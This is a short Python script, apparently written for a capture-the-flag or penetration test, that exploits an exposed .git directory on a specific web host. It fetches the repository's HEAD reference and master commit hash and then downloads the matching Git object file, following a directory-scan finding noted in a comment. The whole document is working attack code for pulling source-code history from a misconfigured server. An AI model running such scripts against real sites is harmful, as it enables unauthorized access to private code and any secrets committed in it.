
```python
#! /usr/local/bin/python
import requests
import base64
import subprocess
domain = "https://db.fishbowl.tech/"
"""
dirb scan found .git/HEAD
"""
path = ".git/HEAD"
#r =requests.get(domain+path)
###ref: refs/heads/master

#get object
path = ".git/refs/heads/master"
r =requests.get(domain+path)
###9a932cc71e599ab95e588820d1dfeca8cc63313a
repo_hash = r.text
folder,repo_hash = repo_hash[:2],repo_hash[2:]

path = ".git/objects/{}/{}".format(folder, repo_hash)
print path
r =requests.get(domain+path)
print(r.text)
```
